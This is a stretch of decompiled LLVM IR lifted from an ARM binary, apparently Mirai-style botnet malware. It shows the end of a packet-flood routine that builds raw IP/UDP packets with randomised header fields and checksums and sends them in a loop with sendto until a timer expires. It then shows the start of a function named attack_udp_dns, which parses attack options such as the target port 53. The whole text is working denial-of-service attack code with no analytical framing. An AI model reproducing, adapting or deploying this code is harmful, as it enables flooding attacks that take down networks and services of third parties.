  %tmp41 = udiv i32 %v7_d2b0, 256
  %v4_d3ec = urem i32 %tmp41, 256
  %v5_d3ec = or i32 %v4_d3ec, %tmp39
  %tmp42 = udiv i32 %v0_d3ac, 256
  %v4_d3f0 = urem i32 %tmp42, 256
  %v5_d3f0 = or i32 %v4_d3f0, %v3_d3e4
  store i32 %v5_d3f0, i32* @lr, align 4
  %tmp43 = mul i32 %v6_d30c, 256
  %v3_d3f4 = and i32 %tmp43, 65280
  store i32 %v3_d3f4, i32* %r2.global-to-local, align 4
  %v5_d3f8 = trunc i32 %v5_d3ec to i16
  %tmp44 = udiv i32 %v6_d30c, 256
  %v4_d400 = urem i32 %tmp44, 256
  %v5_d400 = or i32 %v4_d400, %v3_d3f4
  store i32 %v5_d400, i32* @r6, align 4
  store i32 %v0_d3c4, i32* @r4, align 4
  %sext5 = mul nuw i32 %v5_d3f0, 65536
  %v4_d4d0 = sdiv i32 %sext5, 65536
  %v1_d47c = trunc i32 %v6_d2c8 to i8
  br label %dec_label_pc_d408

dec_label_pc_d408:                                ; preds = %.thread, %dec_label_pc_d3d8
  %v2_d410 = call i32 @calloc(i32 128, i32 1)
  %v3_d414 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d414, i32* %r2.global-to-local, align 4
  %v1_d418 = load i32, i32* @sb, align 4
  %v2_d418 = load i32, i32* @r4, align 4
  %v5_d418 = mul i32 %v2_d418, 4
  %v6_d418 = add i32 %v5_d418, %v1_d418
  %v7_d418 = inttoptr i32 %v6_d418 to i32*
  store i32 %v2_d410, i32* %v7_d418, align 4
  %v0_d41c = load i32, i32* %r2.global-to-local, align 4
  %v3_d41c = mul i32 %v0_d41c, 32
  store i32 %v3_d41c, i32* %r3.global-to-local, align 4
  %v0_d420 = load i32, i32* @sb, align 4
  %v4_d420 = mul i32 %v0_d41c, 4
  %v5_d420 = add i32 %v0_d420, %v4_d420
  %v6_d420 = inttoptr i32 %v5_d420 to i32*
  %v7_d420 = load i32, i32* %v6_d420, align 4
  store i32 %v7_d420, i32* @lr, align 4
  %v5_d424 = mul i32 %v0_d41c, 24
  store i32 %v5_d424, i32* %r3.global-to-local, align 4
  %v1_d428 = load i32, i32* @r8, align 4
  %v2_d428 = add i32 %v1_d428, %v5_d424
  store i32 %v2_d428, i32* @r5, align 4
  %v1_d42c = inttoptr i32 %v7_d420 to i8*
  %v2_d42c = load i8, i8* %v1_d42c, align 1
  %tmp = urem i8 %v2_d42c, 16
  %v1_d430 = zext i8 %tmp to i32
  %v1_d434 = or i32 %v1_d430, 64
  store i32 %v1_d434, i32* %r3.global-to-local, align 4
  %v1_d43c = trunc i32 %v1_d434 to i8
  store i8 %v1_d43c, i8* %v1_d42c, align 1
  %v0_d440 = load i32, i32* @lr, align 4
  %v1_d440 = inttoptr i32 %v0_d440 to i8*
  %v2_d440 = load i8, i8* %v1_d440, align 1
  %v1_d444 = and i8 %v2_d440, -16
  %v1_d448 = or i8 %v1_d444, 5
  store i8 %v1_d448, i8* %v1_d440, align 1
  %v2_d454 = load i32, i32* @lr, align 4
  %v3_d454 = add i32 %v2_d454, 1
  %v4_d454 = inttoptr i32 %v3_d454 to i8*
  store i8 %v5_d2ac, i8* %v4_d454, align 1
  %v3_d458 = load i32, i32* %stack_var_-48, align 4
  %v3_d45c = mul i32 %v3_d458, 65536
  %v1_d460 = add i32 %v3_d45c, 2097152
  %v3_d464 = udiv i32 %v1_d460, 256
  %v1_d468 = and i32 %v3_d464, 65280
  %v4_d46c = udiv i32 %v1_d460, 16777216
  %v5_d46c = or i32 %v1_d468, %v4_d46c
  store i32 %v5_d46c, i32* %r3.global-to-local, align 4
  store i32 %v1_d2f4, i32* %r4.global-to-local, align 4
  %v3_d478 = urem i32 %v3_d458, 65536
  store i32 %v3_d478, i32* %r2.global-to-local, align 4
  %v2_d47c = load i32, i32* @lr, align 4
  %v3_d47c = add i32 %v2_d47c, 8
  %v4_d47c = inttoptr i32 %v3_d47c to i8*
  store i8 %v1_d47c, i8* %v4_d47c, align 1
  %v0_d480 = load i32, i32* %r3.global-to-local, align 4
  %v1_d480 = trunc i32 %v0_d480 to i16
  %v2_d480 = load i32, i32* @lr, align 4
  %v3_d480 = add i32 %v2_d480, 2
  %v4_d480 = inttoptr i32 %v3_d480 to i16*
  store i16 %v1_d480, i16* %v4_d480, align 2
  %v0_d484 = load i32, i32* %r2.global-to-local, align 4
  %v1_d484 = mul i32 %v0_d484, 65536
  %v3_d48c = add i32 %v1_d484, 786432
  store i32 %v3_d48c, i32* %r2.global-to-local, align 4
  %v2_d490 = load i32, i32* @lr, align 4
  %v3_d490 = add i32 %v2_d490, 4
  %v4_d490 = inttoptr i32 %v3_d490 to i16*
  store i16 %v5_d3f8, i16* %v4_d490, align 2
  %v0_d494 = load i32, i32* %r2.global-to-local, align 4
  %v3_d494 = udiv i32 %v0_d494, 256
  %v1_d498 = and i32 %v3_d494, 65280
  %v4_d49c = udiv i32 %v0_d494, 16777216
  %v5_d49c = or i32 %v1_d498, %v4_d49c
  store i32 %v5_d49c, i32* %ip.global-to-local, align 4
  %v2_d4a4 = load i32, i32* @lr, align 4
  %v3_d4a4 = add i32 %v2_d4a4, 9
  %v4_d4a4 = inttoptr i32 %v3_d4a4 to i8*
  store i8 17, i8* %v4_d4a4, align 1
  %v0_d4a8 = load i32, i32* %r4.global-to-local, align 4
  %v2_d4a8 = icmp eq i32 %v0_d4a8, 0
  store i32 ptrtoint (i32* @global_var_27164.91 to i32), i32* %r3.global-to-local, align 4
  br i1 %v2_d4a8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_d408
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_d4b4 = load i32, i32* @lr, align 4
  %v4_d4b4 = add i32 %v3_d4b4, 6
  %v5_d4b4 = inttoptr i32 %v4_d4b4 to i16*
  store i16 64, i16* %v5_d4b4, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_d408, %bb
  %v2_d4b8 = load i32, i32* @global_var_27164.91, align 4
  store i32 %v2_d4b8, i32* %r2.global-to-local, align 4
  %v1_d4bc = load i32, i32* @lr, align 4
  %v2_d4bc = add i32 %v1_d4bc, 12
  %v3_d4bc = inttoptr i32 %v2_d4bc to i32*
  store i32 %v2_d4b8, i32* %v3_d4bc, align 4
  %v0_d4c0 = load i32, i32* @r5, align 4
  %v1_d4c0 = add i32 %v0_d4c0, 16
  %v2_d4c0 = inttoptr i32 %v1_d4c0 to i32*
  %v3_d4c0 = load i32, i32* %v2_d4c0, align 4
  store i32 %v3_d4c0, i32* %r3.global-to-local, align 4
  %v0_d4c4 = load i32, i32* @lr, align 4
  %v1_d4c4 = add i32 %v0_d4c4, 20
  store i32 %v1_d4c4, i32* %r4.global-to-local, align 4
  %v0_d4c8 = load i32, i32* %ip.global-to-local, align 4
  %v1_d4c8 = trunc i32 %v0_d4c8 to i16
  %v3_d4c8 = add i32 %v0_d4c4, 24
  %v4_d4c8 = inttoptr i32 %v3_d4c8 to i16*
  store i16 %v1_d4c8, i16* %v4_d4c8, align 2
  %v0_d4cc = load i32, i32* %r3.global-to-local, align 4
  %v1_d4cc = load i32, i32* @lr, align 4
  %v2_d4cc = add i32 %v1_d4cc, 16
  %v3_d4cc = inttoptr i32 %v2_d4cc to i32*
  store i32 %v0_d4cc, i32* %v3_d4cc, align 4
  store i32 %v4_d4d0, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_d4d8 = load i32, i32* @lr, align 4
  %v2_d4d8 = add i32 %v1_d4d8, 28
  %v3_d4d8 = inttoptr i32 %v2_d4d8 to i32*
  store i32 -1, i32* %v3_d4d8, align 4
  %v0_d4dc = load i32, i32* %ip.global-to-local, align 4
  %v1_d4dc = trunc i32 %v0_d4dc to i16
  %v2_d4dc = load i32, i32* %r4.global-to-local, align 4
  %v3_d4dc = add i32 %v2_d4dc, 2
  %v4_d4dc = inttoptr i32 %v3_d4dc to i16*
  store i16 %v1_d4dc, i16* %v4_d4dc, align 2
  %v0_d4e0 = load i32, i32* @lr, align 4
  %v1_d4e0 = add i32 %v0_d4e0, 32
  %v0_d4e4 = load i32, i32* @r6, align 4
  %v1_d4e4 = trunc i32 %v0_d4e4 to i16
  %v3_d4e4 = add i32 %v0_d4e0, 20
  %v4_d4e4 = inttoptr i32 %v3_d4e4 to i16*
  store i16 %v1_d4e4, i16* %v4_d4e4, align 2
  %v3_d4e8 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d4e8, i32* %r2.global-to-local, align 4
  %v3_d4ec = call i32 @util_memcpy(i32 %v1_d4e0, i32 %v3_d354, i32 %v3_d4e8)
  %v3_d4f0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d4f0, i32* %r3.global-to-local, align 4
  %v1_d4f4 = add i32 %v3_d4f0, 1
  store i32 %v1_d4f4, i32* @r4, align 4
  %v1_d4f8 = load i32, i32* @fp, align 4
  store i32 %v1_d4f4, i32* %stack_var_-44, align 4
  %v5_d500 = icmp slt i32 %v1_d4f4, %v1_d4f8
  br i1 %v5_d500, label %dec_label_pc_d408, label %dec_label_pc_d504.preheader

dec_label_pc_d504.preheader:                      ; preds = %.thread, %dec_label_pc_d3a0
  %v0_d508.ph = phi i32 [ 0, %dec_label_pc_d3a0 ], [ %v1_d4f8, %.thread ]
  %v3_d520 = icmp eq i32 %v3_d3b4, 65535
  br label %dec_label_pc_d504

dec_label_pc_d504:                                ; preds = %dec_label_pc_d504.preheader, %dec_label_pc_d684.dec_label_pc_d504_crit_edge
  %v0_d508 = phi i32 [ %v0_d508.pre, %dec_label_pc_d684.dec_label_pc_d504_crit_edge ], [ %v0_d508.ph, %dec_label_pc_d504.preheader ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_d508 = icmp eq i32 %v0_d508, 0
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_d508, label %dec_label_pc_d684, label %dec_label_pc_d514

dec_label_pc_d514:                                ; preds = %dec_label_pc_d504
  br label %dec_label_pc_d5c8

dec_label_pc_d51c:                                ; preds = %dec_label_pc_d5c8
  br i1 %v3_d520, label %dec_label_pc_d650, label %dec_label_pc_d528

dec_label_pc_d528:                                ; preds = %dec_label_pc_d5f0.dec_label_pc_d528_crit_edge, %dec_label_pc_d51c
  %v1_d52c = phi i32 [ %v1_d52c.pre, %dec_label_pc_d5f0.dec_label_pc_d528_crit_edge ], [ 65535, %dec_label_pc_d51c ]
  store i32 %v3_d3b8, i32* %r2.global-to-local, align 4
  %v9_d52c = icmp eq i32 %v3_d3b8, %v1_d52c
  br i1 %v9_d52c, label %dec_label_pc_d664, label %dec_label_pc_d534

dec_label_pc_d534:                                ; preds = %dec_label_pc_d650.dec_label_pc_d534_crit_edge, %dec_label_pc_d528
  %v1_d538 = phi i32 [ %v1_d538.pre, %dec_label_pc_d650.dec_label_pc_d534_crit_edge ], [ %v1_d52c, %dec_label_pc_d528 ]
  store i32 %v3_d3bc, i32* %r3.global-to-local, align 4
  %v9_d538 = icmp eq i32 %v3_d3bc, %v1_d538
  br i1 %v9_d538, label %dec_label_pc_d678, label %dec_label_pc_d540

dec_label_pc_d540:                                ; preds = %dec_label_pc_d664, %dec_label_pc_d534, %dec_label_pc_d678
  store i32 0, i32* @r4, align 4
  %v2_d548 = load i32, i32* @r5, align 4
  %v3_d548 = add i32 %v2_d548, 10
  %v4_d548 = inttoptr i32 %v3_d548 to i16*
  store i16 0, i16* %v4_d548, align 2
  %v0_d54c = load i32, i32* @r5, align 4
  store i32 %v0_d54c, i32* @r0, align 4
  %v2_d550 = call i32 @checksum_generic(i32 %v0_d54c, i32 20)
  %v3_d550 = trunc i32 %v2_d550 to i16
  %v3_d554 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d554, i32* %r3.global-to-local, align 4
  %v3_d558 = load i32, i32* @r5, align 4
  %v4_d558 = add i32 %v3_d558, 10
  %v5_d558 = inttoptr i32 %v4_d558 to i16*
  store i16 %v3_d550, i16* %v5_d558, align 2
  %v0_d55c = load i32, i32* @r6, align 4
  store i32 %v0_d55c, i32* @r1, align 4
  %v1_d560 = add i32 %v0_d55c, 4
  %v2_d560 = inttoptr i32 %v1_d560 to i16*
  %v3_d560 = load i16, i16* %v2_d560, align 2
  %v4_d560 = zext i16 %v3_d560 to i32
  store i32 %v4_d560, i32* %r2.global-to-local, align 4
  %v0_d564 = load i32, i32* @r4, align 4
  %v1_d564 = trunc i32 %v0_d564 to i16
  %v3_d564 = add i32 %v0_d55c, 6
  %v4_d564 = inttoptr i32 %v3_d564 to i16*
  store i16 %v1_d564, i16* %v4_d564, align 2
  %v0_d568 = load i32, i32* %r3.global-to-local, align 4
  %v1_d568 = add i32 %v0_d568, 12
  store i32 %v1_d568, i32* %r3.global-to-local, align 4
  %v0_d56c = load i32, i32* @r5, align 4
  %v4_d570 = call i32 @checksum_tcpudp(i32 %v0_d56c, i32 %v0_d55c, i32 %v4_d560, i32 %v1_d568)
  %v5_d570 = trunc i32 %v4_d570 to i16
  %v3_d574 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d574, i32* %r3.global-to-local, align 4
  %v3_d578 = mul i32 %v3_d574, 32
  store i32 %v3_d578, i32* %lr.global-to-local, align 4
  %v3_d57c = load i32, i32* @r6, align 4
  %v4_d57c = add i32 %v3_d57c, 6
  %v5_d57c = inttoptr i32 %v4_d57c to i16*
  store i16 %v5_d570, i16* %v5_d57c, align 2
  %v0_d580 = load i32, i32* %lr.global-to-local, align 4
  %v1_d580 = load i32, i32* %r3.global-to-local, align 4
  %tmp45 = mul i32 %v1_d580, -8
  %v5_d580 = add i32 %v0_d580, %tmp45
  store i32 %v5_d580, i32* %lr.global-to-local, align 4
  %v0_d584 = load i32, i32* @r6, align 4
  %v1_d584 = add i32 %v0_d584, 2
  %v2_d584 = inttoptr i32 %v1_d584 to i16*
  %v3_d584 = load i16, i16* %v2_d584, align 2
  %v4_d584 = zext i16 %v3_d584 to i32
  store i32 %v4_d584, i32* @r6, align 4
  %v3_d588 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d588, i32* %r2.global-to-local, align 4
  %v1_d58c = load i32, i32* @r8, align 4
  %v2_d58c = add i32 %v1_d58c, %v5_d580
  store i32 %v2_d58c, i32* @lr, align 4
  %v3_d590 = add i32 %v2_d58c, 2
  %v4_d590 = inttoptr i32 %v3_d590 to i16*
  store i16 %v3_d584, i16* %v4_d590, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_d59c = load i32, i32* @r5, align 4
  %v0_d5a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_d5a0 = add i32 %v0_d5a0, 32
  store i32 %v1_d5a0, i32* %r2.global-to-local, align 4
  %v0_d5a4 = load i32, i32* @sl, align 4
  %v0_d5a8 = load i32, i32* @lr, align 4
  %v6_d5b0 = call i32 @__libc_sendto(i32 %v0_d5a4, i32 %v0_d59c, i32 %v1_d5a0, i32 16384, i32 %v0_d5a8, i32 16)
  %v3_d5b4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d5b4, i32* %r3.global-to-local, align 4
  %v1_d5b8 = add i32 %v3_d5b4, 1
  %v1_d5bc = load i32, i32* @fp, align 4
  store i32 %v1_d5b8, i32* %stack_var_-44, align 4
  %v6_d5c4 = icmp slt i32 %v1_d5b8, %v1_d5bc
  br i1 %v6_d5c4, label %dec_label_pc_d5c8, label %dec_label_pc_d684

dec_label_pc_d5c8:                                ; preds = %dec_label_pc_d540, %dec_label_pc_d514
  %v1_d5d8 = phi i32 [ %v1_d5b8, %dec_label_pc_d540 ], [ 0, %dec_label_pc_d514 ]
  %v5_d5cc = mul i32 %v1_d5d8, 24
  %v1_d5d0 = load i32, i32* @r8, align 4
  %v2_d5d0 = add i32 %v1_d5d0, %v5_d5cc
  store i32 %v2_d5d0, i32* %r3.global-to-local, align 4
  %v1_d5d4 = add i32 %v2_d5d0, 20
  %v2_d5d4 = inttoptr i32 %v1_d5d4 to i8*
  %v3_d5d4 = load i8, i8* %v2_d5d4, align 1
  %v4_d5d4 = zext i8 %v3_d5d4 to i32
  store i32 %v4_d5d4, i32* %r2.global-to-local, align 4
  %v0_d5d8 = load i32, i32* @sb, align 4
  %v4_d5d8 = mul i32 %v1_d5d8, 4
  %v5_d5d8 = add i32 %v0_d5d8, %v4_d5d8
  %v6_d5d8 = inttoptr i32 %v5_d5d8 to i32*
  %v7_d5d8 = load i32, i32* %v6_d5d8, align 4
  store i32 %v7_d5d8, i32* @r5, align 4
  store i32 65535, i32* @r7, align 4
  %v1_d5e8 = add i32 %v7_d5d8, 20
  store i32 %v1_d5e8, i32* @r6, align 4
  %tmp46 = icmp ugt i8 %v3_d5d4, 31
  br i1 %tmp46, label %dec_label_pc_d51c, label %dec_label_pc_d5f0

dec_label_pc_d5f0:                                ; preds = %dec_label_pc_d5c8
  %v1_d5f0 = add i32 %v2_d5d0, 16
  %v2_d5f0 = inttoptr i32 %v1_d5f0 to i32*
  %v3_d5f0 = load i32, i32* %v2_d5f0, align 4
  store i32 %v3_d5f0, i32* %r4.global-to-local, align 4
  %v0_d5f4 = call i32 @rand_next()
  %v3_d5f8 = load i32, i32* %stack_var_-44, align 4
  %v5_d600 = mul i32 %v3_d5f8, 24
  %v1_d604 = and i32 %v3_d5f0, 16711680
  store i32 %v1_d604, i32* %ip.global-to-local, align 4
  %v3_d608 = udiv i32 %v3_d5f0, 16777216
  %v4_d60c = udiv i32 %v1_d604, 256
  %v5_d60c = or i32 %v4_d60c, %v3_d608
  store i32 %v5_d60c, i32* %r2.global-to-local, align 4
  %v1_d610 = load i32, i32* @r8, align 4
  %v2_d610 = add i32 %v1_d610, %v5_d600
  %v1_d614 = and i32 %v3_d5f0, 65280
  store i32 %v1_d614, i32* %r3.global-to-local, align 4
  %v1_d618 = add i32 %v2_d610, 20
  %v2_d618 = inttoptr i32 %v1_d618 to i8*
  %v3_d618 = load i8, i8* %v2_d618, align 1
  %v4_d618 = zext i8 %v3_d618 to i32
  store i32 %v4_d618, i32* %ip.global-to-local, align 4
  %v5_d620 = call i32 @llvm.bswap.i32(i32 %v3_d5f0)
  %v7_d624 = lshr i32 %v0_d5f4, %v4_d618
  %v8_d624 = add i32 %v7_d624, %v5_d620
  store i32 %v8_d624, i32* %r2.global-to-local, align 4
  %v5_d640 = call i32 @llvm.bswap.i32(i32 %v8_d624)
  store i32 %v5_d640, i32* %r3.global-to-local, align 4
  %v1_d644 = load i32, i32* @r7, align 4
  %v9_d644 = icmp eq i32 %v3_d3b4, %v1_d644
  %v1_d648 = load i32, i32* @r5, align 4
  %v2_d648 = add i32 %v1_d648, 16
  %v3_d648 = inttoptr i32 %v2_d648 to i32*
  store i32 %v5_d640, i32* %v3_d648, align 4
  br i1 %v9_d644, label %dec_label_pc_d650, label %dec_label_pc_d5f0.dec_label_pc_d528_crit_edge

dec_label_pc_d5f0.dec_label_pc_d528_crit_edge:    ; preds = %dec_label_pc_d5f0
  %v1_d52c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d528

dec_label_pc_d650:                                ; preds = %dec_label_pc_d5f0, %dec_label_pc_d51c
  %v0_d650 = call i32 @rand_next()
  %v1_d650 = trunc i32 %v0_d650 to i16
  store i32 %v3_d3b8, i32* %r2.global-to-local, align 4
  %v1_d658 = load i32, i32* @r7, align 4
  %v9_d658 = icmp eq i32 %v3_d3b8, %v1_d658
  %v3_d65c = load i32, i32* @r5, align 4
  %v4_d65c = add i32 %v3_d65c, 4
  %v5_d65c = inttoptr i32 %v4_d65c to i16*
  store i16 %v1_d650, i16* %v5_d65c, align 2
  br i1 %v9_d658, label %dec_label_pc_d664, label %dec_label_pc_d650.dec_label_pc_d534_crit_edge

dec_label_pc_d650.dec_label_pc_d534_crit_edge:    ; preds = %dec_label_pc_d650
  %v1_d538.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d534

dec_label_pc_d664:                                ; preds = %dec_label_pc_d650, %dec_label_pc_d528
  %v0_d664 = call i32 @rand_next()
  %v1_d664 = trunc i32 %v0_d664 to i16
  store i32 %v3_d3bc, i32* %r3.global-to-local, align 4
  %v1_d66c = load i32, i32* @r7, align 4
  %v9_d66c = icmp eq i32 %v3_d3bc, %v1_d66c
  %v3_d670 = load i32, i32* @r5, align 4
  %v4_d670 = add i32 %v3_d670, 20
  %v5_d670 = inttoptr i32 %v4_d670 to i16*
  store i16 %v1_d664, i16* %v5_d670, align 2
  br i1 %v9_d66c, label %dec_label_pc_d678, label %dec_label_pc_d540

dec_label_pc_d678:                                ; preds = %dec_label_pc_d664, %dec_label_pc_d534
  %v0_d678 = call i32 @rand_next()
  %v1_d678 = trunc i32 %v0_d678 to i16
  %v3_d67c = load i32, i32* @r6, align 4
  %v4_d67c = add i32 %v3_d67c, 2
  %v5_d67c = inttoptr i32 %v4_d67c to i16*
  store i16 %v1_d678, i16* %v5_d67c, align 2
  br label %dec_label_pc_d540

dec_label_pc_d684:                                ; preds = %dec_label_pc_d540, %dec_label_pc_d504
  %v2_d688 = call i32 @__GI_time(i32* null)
  store i32 %v2_d33c, i32* %ip.global-to-local, align 4
  %v6_d694 = icmp slt i32 %v2_d33c, %v2_d688
  br i1 %v6_d694, label %dec_label_pc_d698, label %dec_label_pc_d684.dec_label_pc_d504_crit_edge

dec_label_pc_d684.dec_label_pc_d504_crit_edge:    ; preds = %dec_label_pc_d684
  %v0_d508.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_d504

dec_label_pc_d698:                                ; preds = %dec_label_pc_d684, %entry, %dec_label_pc_d6a4
  %v1_d6a0 = phi i32 [ %v3_d368, %entry ], [ %v1_d6a8, %dec_label_pc_d6a4 ], [ %v2_d688, %dec_label_pc_d684 ]
  store i32 %v3_d248, i32* %r4.global-to-local, align 4
  store i32 %v27_d248, i32* %lr.global-to-local, align 4
  ret i32 %v1_d6a0

dec_label_pc_d6a4:                                ; preds = %dec_label_pc_d378
  %v0_d6a4 = load i32, i32* @sl, align 4
  %v1_d6a8 = call i32 @__GI___libc_close(i32 %v0_d6a4)
  br label %dec_label_pc_d698

; uselistorder directives
  uselistorder i32 %v5_d640, { 1, 0 }
  uselistorder i32 %v3_d5f0, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_d5b8, { 1, 2, 0 }
  uselistorder i32 %v5_d580, { 1, 0 }
  uselistorder i32 %v0_d55c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_d4f4, { 1, 0, 2 }
  uselistorder i32 %v3_d458, { 1, 0 }
  uselistorder i32 %v0_d41c, { 1, 2, 0 }
  uselistorder i32 %v3_d3f4, { 1, 0 }
  uselistorder i32 %v3_d3b4, { 0, 2, 1 }
  uselistorder i32 %v0_d3ac, { 1, 0, 2 }
  uselistorder i32 %v3_d368, { 1, 2, 3, 0 }
  uselistorder i32 %v2_d33c, { 1, 0 }
  uselistorder i32 %v6_d30c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_d2f4, { 1, 0 }
  uselistorder i32 %v6_d2c8, { 1, 0 }
  uselistorder i32 %v7_d2b0, { 1, 0, 2 }
  uselistorder i32 %v5_d28c, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 12, 4, 5, 6, 7, 8, 9, 10, 11, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 9, 4, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 0 }
  uselistorder label %dec_label_pc_d698, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d540, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d504, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_udp_dns(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-2124 = alloca i32, align 4
  %v18_d6b4 = load i32, i32* @sb, align 4
  %v27_d6b4 = load i32, i32* @lr, align 4
  store i32 0, i32* @sl, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_d6e4 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_d6e8 = load i32, i32* @r4, align 4
  store i32 %v0_d6e8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_d6f4 = load i32, i32* @sl, align 4
  store i32 %v0_d6f4, i32* %r3.global-to-local, align 4
  %v0_d6f8 = load i32, i32* @r5, align 4
  store i32 %v0_d6f8, i32* %r0.global-to-local, align 4
  %v5_d6fc = inttoptr i32 %v0_d6e8 to i32*
  %v6_d6fc = call i32 @attack_get_opt_int(i32 %v0_d6f8, i32* %v5_d6fc, i32 2, i32 %v0_d6f4)
  %v1_d708 = urem i32 %v6_d6fc, 256
  store i32 %v1_d708, i32* %ip.global-to-local, align 4
  %v0_d70c = load i32, i32* @r4, align 4
  store i32 %v0_d70c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_d718 = load i32, i32* @r5, align 4
  store i32 %v0_d718, i32* %r0.global-to-local, align 4
  %v6_d720 = inttoptr i32 %v0_d70c to i32*
  %v7_d720 = call i32 @attack_get_opt_int(i32 %v0_d718, i32* %v6_d720, i32 3, i32 65535)
  %v0_d724 = load i32, i32* @r4, align 4
  store i32 %v0_d724, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_d734 = load i32, i32* @r5, align 4
  store i32 %v0_d734, i32* %r0.global-to-local, align 4
  %v5_d738 = inttoptr i32 %v0_d724 to i32*
  %v6_d738 = call i32 @attack_get_opt_int(i32 %v0_d734, i32* %v5_d738, i32 4, i32 64)
  %v0_d740 = load i32, i32* @r4, align 4
  store i32 %v0_d740, i32* %r1.global-to-local, align 4
  %v1_d744 = urem i32 %v6_d738, 256
  store i32 %v1_d744, i32* %ip.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v0_d74c = load i32, i32* @sl, align 4
  store i32 %v0_d74c, i32* %r3.global-to-local, align 4
  %v0_d750 = load i32, i32* @r5, align 4
  store i32 %v0_d750, i32* %r0.global-to-local, align 4
  %v6_d758 = inttoptr i32 %v0_d740 to i32*
  %v7_d758 = call i32 @attack_get_opt_int(i32 %v0_d750, i32* %v6_d758, i32 5, i32 %v0_d74c)
  %v1_d764 = urem i32 %v7_d758, 256
  store i32 %v1_d764, i32* %ip.global-to-local, align 4
  %v0_d768 = load i32, i32* @r4, align 4
  store i32 %v0_d768, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_d774 = load i32, i32* @r5, align 4
  store i32 %v0_d774, i32* %r0.global-to-local, align 4
  %v5_d77c = inttoptr i32 %v0_d768 to i32*
  %v6_d77c = call i32 @attack_get_opt_int(i32 %v0_d774, i32* %v5_d77c, i32 6, i32 65535)
  %v0_d780 = load i32, i32* @r4, align 4
  store i32 %v0_d780, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  %v0_d790 = load i32, i32* @r5, align 4
  store i32 %v0_d790, i32* %r0.global-to-local, align 4
  %v5_d794 = inttoptr i32 %v0_d780 to i32*
  %v6_d794 = call i32 @attack_get_opt_int(i32 %v0_d790, i32* %v5_d794, i32 7, i32 53)
  %v0_d79c = load i32, i32* @r4, align 4
  store i32 %v0_d79c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v0_d7ac = load i32, i32* @r5, align 4
  store i32 %v0_d7ac, i32* %r0.global-to-local, align 4
  %v5_d7b0 = inttoptr i32 %v0_d79c to i32*
  %v6_d7b0 = call i32 @attack_get_opt_int(i32 %v0_d7ac, i32* %v5_d7b0, i32 9, i32 65535)
  %v0_d7b4 = load i32, i32* @r4, align 4
  store i32 %v0_d7b4, i32* %r1.global-to-local, align 4
  %v0_d7bc = load i32, i32* @sl, align 4
  store i32 %v0_d7bc, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v0_d7c4 = load i32, i32* @r5, align 4
  store i32 %v0_d7c4, i32* %r0.global-to-local, align 4
  %v5_d7c8 = inttoptr i32 %v0_d7b4 to i32*
